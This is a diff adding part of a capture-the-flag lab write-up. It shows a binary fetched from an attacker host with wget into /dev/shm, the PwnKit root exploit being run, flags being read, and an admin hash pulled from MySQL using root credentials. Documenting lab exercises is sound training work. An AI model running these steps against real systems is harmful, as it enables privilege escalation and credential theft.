@@ -97,4 +97,29 @@
           - Command : python3 -m http.server 80
         - 2nd  Go to victim terminal and download the binary by following 
           - Command : wget http://[attackerIP:PORT]/file_name
-          - 
+            ![12  Tranferring binary](https://user-images.githubusercontent.com/75413146/153705932-8b8fc8a4-8b4c-4c3b-bd0a-c459c21fbfc6.png)
+            
+            Also note the workding directory i am in /dev/shm. You must have a writable permission on a directory. Like /tmp or /dev/shm or /var/tmp
+            Now we got the binary so let's make it executable by using command : 
+              - chmod +x PwnKit
+        Let's now run the binary 
+          ![13  Got Shell](https://user-images.githubusercontent.com/75413146/153706089-1213c008-3b53-42d1-b140-c7ccdd2a82d2.png)
+        
+        Controlling Emotions of getting root shell ;-;
+          So let's get the flags and end it ASAP.
+          - /home/mike has user.txt
+          - /root/ has root.txt
+            ![13  Flags txt](https://user-images.githubusercontent.com/75413146/153706142-3bab8ddf-4894-42aa-8841-063eefd5e45d.png)
+        Also we need hash of an admin user to complete the room
+          - Use command netstat -altuopn for checking the services runnning on localhost
+          - We can see 3306 is running which is mysql port.
+          - Using mysql -u root -p [use password as root]
+          - accessing the database.
+          - and we got the admin hash submitting it and ok the room has been completed.
+            ![14  databases](https://user-images.githubusercontent.com/75413146/153706239-3c34e211-ac40-44b8-bea1-97ed28ac16e1.png)
+            ![14 2 databases](https://user-images.githubusercontent.com/75413146/153706246-a4230f42-9b67-4820-895e-dd7e3d34aec5.png)
+            ![14 3 database hash](https://user-images.githubusercontent.com/75413146/153706249-57ca5fea-01e4-4fc7-88a2-1ef0184433f2.png)
+
+
+
+
